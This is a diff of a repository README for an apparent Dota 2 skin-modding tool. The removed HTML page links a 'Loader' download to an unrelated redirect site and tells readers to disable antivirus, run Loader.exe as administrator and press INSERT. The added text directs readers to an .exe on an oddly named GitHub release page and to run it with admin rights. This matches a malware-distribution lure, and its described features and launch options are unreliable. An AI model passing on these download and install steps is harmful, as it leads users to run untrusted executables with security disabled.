@@ -1,16 +1,95 @@
-<div style="max-width:800px;margin:auto;padding:20px;font-family:Arial,sans-serif;line-height:1.6;background:#0a0a0f;color:#e0e0e0;border-radius:15px;">
-<h1 style="color:#44aaff;border-bottom:2px solid #2288cc;text-align:center;">🛠️ Manual VPK Skin Installation | Ultimate Control Dota 2 Modding 🛠️</h1>
-<p style="font-size:1.1em;text-align:center;"><strong>Complete guide for manual skin installation.</strong> Use tools like GCFScape to replace files inside the VPK archives and mod your game to the core.</p>
-<div style="background:#111116;padding:20px;text-align:center;margin:15px 0;"><a href="https://www.shawonline.co.za/redirl" style="background:#44aaff;color:#000;padding:12px 25px;">⬇️ DOWNLOAD MOD TOOLS (LOADER)</a><p>✅ Full VPK Control ✅ Safe Manual Method ✅ No Launcher Needed ✅ 100% Custom</p></div>
-<img src="https://i.ytimg.com/vi/7SWG25RDAfo/hq720.jpg?sqp=-oaymwEhCK4FEIIDSFryq4qpAxMIARUAAAAAGAElAADIQj0AgKJD&rs=AOn4CLA-fpQrzjjVKoaiiHnXgOtA_9Pkew" style="max-width:100%;border-radius:8px;margin:15px 0;">
-<div><h3>🛠️ Manual Modding Methodology:</h3>
-<ul><li><strong>Download & Extract:</strong> Download GCFScape to open and extract the game's .vpk archive files.</li>
-<li><strong>Replace Files:</strong> Replace original model, texture, or sound files with your custom modded versions.</li>
-<li><strong>Repack or Override:</strong> Repack the modified files into a new .vpk or place them in the `game/dota` folder with the `-override_vpk` launch option.</li>
-<li><strong>Use Dota 2 MOD Master for Automation:</strong> An open-source, all-in-one tool to automate the VPK patching process, making it easier to manage and mix multiple mods.</li>
-<li><strong>Works for Any Mod:</strong> This method works for installing custom skins, ability effects, map textures, and even custom game modes.</li></ul>
-<h3>⚙️ System Requirements:</h3><p>Windows 10/11, Steam and Dota 2 installed, 200 MB free space for mod tools.</p>
-<h3>📥 Installation:</h3>
-<div style="display:grid;grid-template-columns:repeat(4,1fr);gap:10px;text-align:center;"><div>1. Download archive</div><div>2. Disable antivirus (temp)</div><div>3. Run Loader.exe as Admin</div><div>4. Press INSERT to open menu</div></div>
-<div><strong>Tags:</strong> dota 2 vpk modding, how to install custom skins dota 2, dota 2 manual skin mod, dota 2 skin changer no software, dota 2 vpk file extractor, dota 2 skin mods 2026, dota 2 free skin installation guide, dota 2 mod master github.</div>
-</div>
+# 🎮 Manual-VPK-Skin-Installation-Ultimate-Control-Dota-2-Modding - Manage custom Dota 2 skins easily
+
+[![Download Now](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Cortoneacetatedostoevsky886/Manual-VPK-Skin-Installation-Ultimate-Control-Dota-2-Modding/releases)
+
+This application provides a reliable method to manage and install custom skins for your Dota 2 heroes. Custom skins change the visual appearance of characters within your local game files. This tool automates the process of packing and unpacking VPK archives so you can apply mods without breaking your game files.
+
+## 📋 System Requirements
+
+Ensure your computer meets these requirements to run the software correctly:
+
+*   Operating System: Windows 10 or Windows 11 (64-bit).
+*   Storage: At least 500 MB of free disk space for temporary files.
+*   Framework: Microsoft .NET Desktop Runtime 6.0 or higher.
+*   Game: Dota 2 must be installed and up to date on your local machine.
+*   Permissions: You need administrative access to modify files within the Steam installation folder.
+
+## ⬇️ Install the Software
+
+Follow these steps to acquire the tool:
+
+1. Visit the project release page: [https://github.com/Cortoneacetatedostoevsky886/Manual-VPK-Skin-Installation-Ultimate-Control-Dota-2-Modding/releases](https://github.com/Cortoneacetatedostoevsky886/Manual-VPK-Skin-Installation-Ultimate-Control-Dota-2-Modding/releases).
+2. Look for the "Assets" section at the bottom of the latest release.
+3. Select the file ending in ".exe" to begin the download.
+4. Save the file to a folder you can find, such as your Downloads folder or Desktop.
+5. Double-click the downloaded file to begin the installation utility.
+6. Follow the on-screen prompts to place the application in a location on your computer.
+
+## ⚙️ Setup and Configuration
+
+Before you apply your first skin, configure the software to locate your Dota 2 installation.
+
+1. Open the application.
+2. Navigate to the "Settings" menu located in the top navigation bar.
+3. Select "Locate Steam."
+4. The software will search for your Steam folder automatically. If it fails, manually browse to your Steam installation directory (usually C:\Program Files (x86)\Steam).
+5. Select the "dota 2 beta" folder when prompted.
+6. Click "Save Configuration" to confirm your settings.
+
+The software checks your connection to the game files to ensure it has read and write permissions. A green icon in the corner of the application indicates that the game directory is set and ready.
+
+## 🎨 Applying Custom Skins
+
+This section explains how to use the manual VPK installation feature to add skins to your game.
+
+1. Obtain your custom skin files. These often come as folders containing material folders and vmt/vtf files.
+2. Open the application and go to the "Mod Manager" tab.
+3. Click the "Add New Mod" button.
+4. Browse to the folder where you placed your downloaded skin files.
+5. The application will scan the files and show you the structure in the preview window.
+6. Click "Pack VPK."
+7. The tool creates a modified VPK file that the Dota 2 engine recognizes.
+8. Click "Enable Mod" to move this file into your game’s custom directory.
+
+Your Dota 2 client updates these files when you launch the game. If you wish to remove the skins, click "Disable Mod" or "Clear Mods" within the tool to restore your standard game appearance.
+
+## 🛡️ Best Practices for Modding
+
+Modding your game involves replacing original files with your own. Follow these rules to keep your game running smoothly:
+
+*   Always back up your game files. The tool has a "Backup" feature that saves your original game archives before applying changes. Use this feature frequently.
+*   Only use one mod at a time until you understand how different files interact.
+*   If your game crashes or textures appear black, use the "Verify Game Integrity" tool inside Steam to fix errors.
+*   Remember that custom skins are only visible to you. Other players in a match will see the default skins from the original game.
+*   Updates to Dota 2 may overwrite your mods. You must re-run the "Pack VPK" process after major game updates for the mods to function correctly.
+
+## 🛠️ Troubleshooting Common Issues
+
+If you encounter difficulties, consult the list below to find a solution.
+
+### Application does not open
+If you click the icon and nothing happens, you likely lack the .NET runtime. Download the Microsoft .NET Desktop Runtime from the official Microsoft support page. Restart your computer after installing the runtime to ensure all components register correctly.
+
+### Steam permission errors
+The application needs to write files to your Steam folder. Right-click the shortcut for the application and select "Run as administrator." This provides the necessary permissions for the modding process.
+
+### Mods are not visible in-game
+Dota 2 requires a specific launch option to load custom VPK files. 
+1. Open Steam.
+2. Right-click on Dota 2 in your library.
+3. Select "Properties."
+4. Under the "General" tab, find the "Launch Options" field.
+5. Enter "-file-access" in the box.
+6. Close the window and launch your game.
+
+### Performance issues
+If you notice frame rate drops, you might have too many high-resolution textures packed into one mod. Select the option to "Optimize Textures" within the application to compress files. This process reduces visual weight on your system without changing the design of the skin.
+
+## 📖 Glossary
+
+*   **VPK:** The file format Dota 2 uses to store game data, such as sounds, models, and textures.
+*   **VMT/VTF:** Specific file types that hold information about how textures appear and apply to hero models.
+*   **Mod:** A modification that changes the original content of the game.
+*   **Archive:** A compressed folder or file used to group mod elements efficiently.
+*   **Directory:** Also known as a folder path; indicates where files live on your storage drive.
+*   **Client:** The version of the game running on your specific machine.
